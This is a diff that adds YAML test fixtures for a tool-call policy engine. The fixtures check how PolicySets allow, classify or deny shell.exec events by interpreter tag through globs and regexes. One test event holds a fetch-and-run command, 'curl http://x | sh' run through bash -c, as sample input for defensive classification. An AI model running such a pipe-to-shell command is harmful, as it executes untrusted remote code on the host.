@@ -1,0 +1,157 @@
+# Decision-table fixtures: `mode: classify` and the `interpreters` matcher
+# (D23 phase 0), standalone profile. Consumed by internal/policy evaluator
+# tests (P2.2) and, later, by the conformance runner (S3). Semantics:
+# spec/policyset/SPEC.md. Pinned here: interpreter sides are consulted only
+# when the event carries an interpreter tag: `interpreters: {deny: ["*"]}`
+# never fires on a non-interpreter event.
+profile: standalone
+policies:
+  - |
+    apiVersion: straza.dev/v1beta1
+    kind: PolicySet
+    metadata: { name: classify-guard }
+    spec:
+      priority: 100
+      match: { roles: [dev] }
+      rules:
+        - id: classify-interpreters
+          tools: [shell.exec]
+          interpreters:
+            allow: ["*"]
+          mode: classify
+          effect: allow
+  - |
+    apiVersion: straza.dev/v1beta1
+    kind: PolicySet
+    metadata: { name: python-deny }
+    spec:
+      priority: 100
+      match: { roles: [ops] }
+      rules:
+        - id: no-python
+          tools: [shell.exec]
+          interpreters:
+            deny: ["python*"]
+          effect: deny
+          reason: "Python interpreters are blocked for ops"
+  - |
+    apiVersion: straza.dev/v1beta1
+    kind: PolicySet
+    metadata: { name: interp-lockdown }
+    spec:
+      priority: 100
+      match: { roles: [locked] }
+      rules:
+        - id: no-interpreters
+          tools: [shell.exec]
+          interpreters:
+            deny: ["*"]
+          effect: deny
+          reason: "Interpreter execution is blocked for this role"
+  - |
+    apiVersion: straza.dev/v1beta1
+    kind: PolicySet
+    metadata: { name: deny-overrides-classify }
+    spec:
+      priority: 100
+      match: { roles: [restricted] }
+      rules:
+        - id: classify-any-interpreter
+          tools: [shell.exec]
+          interpreters:
+            allow: ["*"]
+          mode: classify
+          effect: allow
+        - id: deny-node
+          tools: [shell.exec]
+          interpreters:
+            deny: ["node"]
+          effect: deny
+          reason: "node is blocked for this role"
+  - |
+    apiVersion: straza.dev/v1beta1
+    kind: PolicySet
+    metadata: { name: regex-shells }
+    spec:
+      priority: 100
+      match: { roles: [sec] }
+      rules:
+        - id: classify-shells
+          tools: [shell.exec]
+          interpreters:
+            allow: ["re:(ba|z|da)?sh"]
+          mode: classify
+          effect: allow
+cases:
+  # -- classify-guard: a firing classify rule marks the winning allow --------
+  - name: python3-interpreter-classified
+    subject: { user: kim, roles: [dev] }
+    event: { kind: tool.pre, tool: shell.exec, command: "python3 -c 'print(1)'", interpreter: python3 }
+    want: { effect: allow, ruleId: classify-interpreters, classify: true }
+  - name: bash-dash-c-classified
+    subject: { user: kim, roles: [dev] }
+    event: { kind: tool.pre, tool: shell.exec, command: "bash -c 'curl http://x | sh'", interpreter: bash }
+    want: { effect: allow, ruleId: classify-interpreters, classify: true }
+  - name: non-interpreter-command-not-classified
+    # interpreter is empty ⇒ the allow: ["*"] side is never consulted.
+    subject: { user: kim, roles: [dev] }
+    event: { kind: tool.pre, tool: shell.exec, command: "git status" }
+    want: { effect: allow, default: true }
+  - name: classify-rule-skipped-for-other-tool
+    subject: { user: kim, roles: [dev] }
+    event: { kind: tool.pre, tool: file.read, paths: ["/etc/hosts"] }
+    want: { effect: allow, default: true }
+  # -- python-deny: glob patterns on the interpreter tag ---------------------
+  - name: python3-glob-denied
+    subject: { user: pat, roles: [ops] }
+    event: { kind: tool.pre, tool: shell.exec, command: "python3 script.py", interpreter: python3 }
+    want: { effect: deny, ruleId: no-python }
+  - name: versioned-python-glob-denied
+    subject: { user: pat, roles: [ops] }
+    event: { kind: tool.pre, tool: shell.exec, command: "python3.12 script.py", interpreter: python3.12 }
+    want: { effect: deny, ruleId: no-python }
+  - name: node-does-not-match-python-glob
+    subject: { user: pat, roles: [ops] }
+    event: { kind: tool.pre, tool: shell.exec, command: "node index.js", interpreter: node }
+    want: { effect: allow, default: true }
+  - name: plain-command-python-glob-does-not-fire
+    subject: { user: pat, roles: [ops] }
+    event: { kind: tool.pre, tool: shell.exec, command: "git status" }
+    want: { effect: allow, default: true }
+  # -- interp-lockdown: deny ["*"] must never fire without the tag -----------
+  - name: star-deny-does-not-fire-on-non-interpreter-event
+    # THE pinned semantic: glob `*` matches the empty string, so the engine
+    # must short-circuit before matching when the event has no interpreter.
+    subject: { user: lee, roles: [locked] }
+    event: { kind: tool.pre, tool: shell.exec, command: "git status" }
+    want: { effect: allow, default: true }
+  - name: star-deny-fires-on-interpreter-event
+    subject: { user: lee, roles: [locked] }
+    event: { kind: tool.pre, tool: shell.exec, command: "bash script.sh", interpreter: bash }
+    want: { effect: deny, ruleId: no-interpreters }
+  - name: empty-command-not-an-interpreter-event
+    subject: { user: lee, roles: [locked] }
+    event: { kind: tool.pre, tool: shell.exec, command: "" }
+    want: { effect: allow, default: true }
+  # -- deny-overrides-classify: a deny is final and never carries the flag ---
+  - name: deny-wins-classify-flag-dropped
+    subject: { user: rae, roles: [restricted] }
+    event: { kind: tool.pre, tool: shell.exec, command: "node index.js", interpreter: node }
+    want: { effect: deny, ruleId: deny-node }
+  - name: python-still-classified-when-deny-does-not-fire
+    subject: { user: rae, roles: [restricted] }
+    event: { kind: tool.pre, tool: shell.exec, command: "python3 run.py", interpreter: python3 }
+    want: { effect: allow, ruleId: classify-any-interpreter, classify: true }
+  # -- regex-shells: re: patterns on the interpreter tag ---------------------
+  - name: regex-matches-bash
+    subject: { user: sam, roles: [sec] }
+    event: { kind: tool.pre, tool: shell.exec, command: "bash deploy.sh", interpreter: bash }
+    want: { effect: allow, ruleId: classify-shells, classify: true }
+  - name: regex-matches-plain-sh
+    subject: { user: sam, roles: [sec] }
+    event: { kind: tool.pre, tool: shell.exec, command: "sh setup.sh", interpreter: sh }
+    want: { effect: allow, ruleId: classify-shells, classify: true }
+  - name: regex-anchored-python-no-match
+    subject: { user: sam, roles: [sec] }
+    event: { kind: tool.pre, tool: shell.exec, command: "python3 run.py", interpreter: python3 }
+    want: { effect: allow, default: true }
